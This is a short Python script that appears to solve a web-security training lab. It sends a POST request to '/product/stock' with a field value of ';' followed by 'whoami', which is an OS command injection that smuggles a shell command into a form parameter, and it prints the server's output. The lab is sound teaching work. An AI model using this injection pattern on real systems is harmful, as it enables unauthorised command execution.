from ..utils import *


def solve_lab(session):
    path = "/product/stock"
    data = {"productId": ";", "storeId": "whoami"}

    print_info(
        f'Performing an OS command injection attack by sending a POST request to "{path}" with the following data:'
    )
    print(f"{data}")

    resp = session.post_path(path, data=data)
    print_success("POST request sent successfully with the following response:\n")
    print(resp.text)
